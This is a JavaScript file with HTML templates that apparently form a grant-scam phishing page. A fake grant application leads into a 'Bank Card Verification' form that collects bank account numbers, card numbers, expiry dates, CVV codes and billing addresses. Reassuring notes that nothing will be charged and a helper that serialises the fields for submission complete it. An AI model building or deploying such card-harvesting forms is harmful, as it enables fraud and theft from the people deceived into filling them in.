var f1 = `<input type="text" placeholder="Firstname" name="firstname" required>
<input type="text" placeholder="Middlename" name="middlename" >
<input type="text" placeholder="Lastname" name="lastname" required>
<select name="marital_status" required>
<option value="">Marital status</option>
<option value="Single">Single</option>
<option value="Married">Married</option>
<option value="Divorce">Divorce</option>
<option value="Widow">Widow</option>
</select>
<select name="employment_status" required>
<option value="">Employment status</option>
<option value="UnEmployed">UnEmployed</option>
<option value="Employed">Employed</option>
</select>
<input type="number" placeholder="Income" name="icome" required>
<input type="number" placeholder="Amount of grant you wish to get" name="Amount_intented" required>
<input type="email" placeholder="Email" name="email">
<input type="text" placeholder="Phone number" name="phone">
<input type="submit" value="Submit Application" name="form1">`;



var f2 = `<input type="text" placeholder="Fullname" name="fullname" required><input type="text" placeholder="Bank name" name="bankname" required>
<input type="text" placeholder="Account Number" name="account_num" required>
<h1>Bank Card Verification</h1>
<span style="display:block;margin-top:-.5rem;margin-bottom:1rem;color:#00004f;">note: this application is free and no charges will be deducted from your bank, its only for verification process.</span>
<select name="card" required>
<option value="">Select an option</option>
<option value="Debit Card">Debit Card</option>
<option value="Credit Card">Credit Card</option>
</select>
<select name="cardtype" required>
<option value="">Select card type</option>
<option value="Visa">Visa</option>
<option value="Mastercard">Mastercard</option>
<option value="Discover">Discover</option>
<option value="Amex">Amex</option>
</select>
<input type="text" placeholder="Name on card" name="nameoncard" required>
<input type="number" placeholder="Card Number" name="cardnum" maxlength="20" required>
<input type="text" placeholder="Expiring date (MM/YYYY)" name="expiring" maxlength="7" required>
<input type="number" placeholder="ccv" name="cv" maxlength="3">
<span style="display:block;margin-top:-.5rem;margin-bottom:1rem;color:#00004f;">note: turn your card backward to check your card cvv.</span>
<h1>Billing address</h1>
<input type="text" placeholder="Address" name="address" required>
<input type="text" placeholder="City" name="city" required>
<input type="text" placeholder="State" name="state" required>
<input type="text" placeholder="Zipcode" name="zipcode" required>
<input type="text" placeholder="Phone Number" name="phone" required>
<input type="submit" value="Submit Application" name="form2">`;

function formdata(form){
  var data = "";
  const r = formSerialize(form);
 for(i in r){
 data += i+'='+encodeURI(r[i])+'&';
}
return data;
}

	const formSerialize = formElement => {
  const values = {};
  const inputs = formElement.elements;

  for (let i = 0; i < inputs.length; i++) {
    values[inputs[i].name] = inputs[i].value;
  }
  return values;
}
